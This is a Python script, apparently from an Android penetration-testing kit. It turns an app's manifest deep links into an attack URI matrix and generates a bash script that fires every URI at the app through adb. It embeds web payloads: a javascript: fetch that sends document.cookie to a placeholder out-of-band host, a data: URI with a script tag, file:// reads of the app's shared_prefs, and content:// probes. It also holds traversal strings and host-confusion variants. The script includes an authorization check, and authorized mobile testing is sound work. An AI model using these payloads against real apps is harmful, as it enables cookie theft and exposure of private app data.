#!/usr/bin/env python3
"""
deeplink_matrix.py — turn the manifest routing table into an attack URI matrix.

Usage: deeplink_matrix.py --analysis loot/<pkg>/manifest_analysis.json --out loot/<pkg>
Writes: deeplinks.txt (human matrix + flags) and deeplink_fuzz.sh (adb firing script).

Payload design follows references/fuzzing-and-probing.md: scheme swaps, traversal,
host confusion, parameter games. Firing happens on YOUR OWN device against an
AUTHORIZED app — the generated script re-checks the scope gate.
"""
import json, os, sys, argparse, stat

PARAM_KEYS = ["url", "uri", "link", "redirect", "next", "target", "dest", "return",
              "returnUrl", "callback", "path", "page", "view", "load"]
WEBVIEW_PAYLOADS = [
    "https://OOB/hit?src=deeplink",
    "javascript:fetch('https://OOB/js?c='+document.cookie)",
    "file:///data/data/PKG/shared_prefs/",
    "content://PKG.provider/",
    "data:text/html,<script>fetch('https://OOB/data')</script>",
    "intent://internal#Intent;component=PKG/.MainActivity;end",
]
TRAVERSAL = ["..%2f", "%2e%2e%2f", "....//", "..;/", "%252e%252e%252f"]
HOST_CONF = ["EVIL.TLD", "HOST.EVIL.TLD", "HOST@EVIL.TLD", "HOST%2f@EVIL.TLD", "HOST."]

def gen(analysis_path, out_dir, oob="https://YOUR-OOB.example"):
    d = json.load(open(analysis_path))
    pkg = d.get("package", "PKG")
    links = d.get("deeplinks", [])
    lines, uris, flags = [], [], []

    lines.append(f"# Deep-link attack matrix — {pkg}")
    if not links:
        lines.append("(no manifest deep links — check code-registered: navDeepLink, Branch, FDL, app_links)")
    for dl in links:
        comp = dl["component"]
        lines.append(f"\n## {comp}  autoVerify={dl['autoVerify']} browsable={dl['browsable']}")
        schemes = dl.get("schemes") or ["https"]
        hosts = [h for h in (dl.get("hosts") or []) if h not in ("", "*")]
        paths = [p for p in (dl.get("paths") or []) if p]
        if not paths:
            paths = ["/"]
        if not hosts:
            flags.append(f"{comp}: scheme(s) {schemes} with NO host — matches ALL hosts")
            hosts = ["any.host.example"]
        for s in schemes:
            for h in hosts:
                for p in paths[:3]:
                    base = f"{s}://{h}{p if p.startswith('/') else '/' + p}"
                    lines.append(f"base: {base}")
                    uris.append(base)
                    # parameter games
                    for k in PARAM_KEYS[:6]:
                        for pay in WEBVIEW_PAYLOADS[:4]:
                            u = f"{base}?{k}={pay.replace('OOB', oob.replace('https://','')).replace('PKG', pkg)}"
                            uris.append(u)
                    # traversal in path position
                    for t in TRAVERSAL:
                        uris.append(f"{base}/{t}etc/hosts" if p else f"{s}://{h}/{t}data")
                    # host confusion (App Link validators)
                    if s in ("http", "https"):
                        for hc in HOST_CONF:
                            uris.append(f"{s}://{hc.replace('HOST', h).replace('EVIL.TLD', 'YOUR-OOB.example')}{p}")
        if dl.get("autoVerify"):
            flags.append(f"{comp}: App Link autoVerify — check assetlinks.json on EVERY host; "
                         f"subdomain takeover = verified hijack")

    dedup = list(dict.fromkeys(uris))
    with open(os.path.join(out_dir, "deeplinks.txt"), "w") as f:
        f.write("\n".join(lines))
        f.write(f"\n\n# generated URIs: {len(dedup)}\n")
        f.write("\n".join(dedup[:400]))  # cap the file; the script regenerates anyway
        f.write("\n\n# flags:\n" + "\n".join(f"- {x}" for x in flags) + "\n")

    # firing script
    fs = os.path.join(out_dir, "deeplink_fuzz.sh")
    with open(fs, "w") as f:
        f.write(f"""#!/usr/bin/env bash
# deeplink_fuzz.sh — GENERATED. Fires the URI matrix at {pkg} as an external attacker.
# YOUR OWN device/emulator, authorized app. Edit OOB first (your own server/interactsh).
set -uo pipefail
HERE="$(cd "$(dirname "${{BASH_SOURCE[0]}}")" && pwd)"
SKILL="{os.path.dirname(os.path.dirname(os.path.abspath(__file__)))}"
OOB="${{OOB:-YOUR-OOB.example}}"
"$SKILL/scripts/scope_gate.sh" app {pkg} >/dev/null || {{ echo "[ABORT] not authorized"; exit 1; }}
command -v adb >/dev/null || exit 1
LOG="$HERE/fuzz_deeplinks.log"; mkdir -p "$(dirname "$LOG")"; : > "$LOG"
adb logcat -c 2>/dev/null
fire() {{
  local u="$1"
  u="${{u//YOUR-OOB.example/$OOB}}"
  adb shell log -p i -t HUNT "DLFUZZ $u"
  timeout 6 adb shell am start -a android.intent.action.VIEW -d "$u" >/dev/null 2>&1
  echo "$u" >> "$LOG"
  sleep 0.25
}}
""")
        for u in dedup[:400]:
            esc = u.replace("'", "'\\''")
            f.write(f"fire '{esc}'\n")
        f.write(f"""
echo "[done] $(wc -l < "$LOG") URIs fired. Now:"
echo "  1) check your OOB ($OOB) for hits (WebView fetches, exfil)"
echo "  2) adb logcat -d | grep -iE 'HUNT|webview|loadurl|ActivityManager' > $HERE/fuzz_deeplinks_logcat.txt"
echo "  3) re-run interesting URIs via $SKILL/scripts/deeplink_probe.sh {pkg} '<uri>' with frida_bridge_trace.js attached"
""")
    os.chmod(fs, os.stat(fs).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    print(f"[deeplink_matrix] {len(links)} filters -> {len(dedup)} URIs, {len(flags)} flags -> deeplinks.txt + deeplink_fuzz.sh")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--analysis", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--oob", default="https://YOUR-OOB.example")
    a = ap.parse_args()
    gen(a.analysis, a.out, a.oob)

if __name__ == "__main__":
    main()
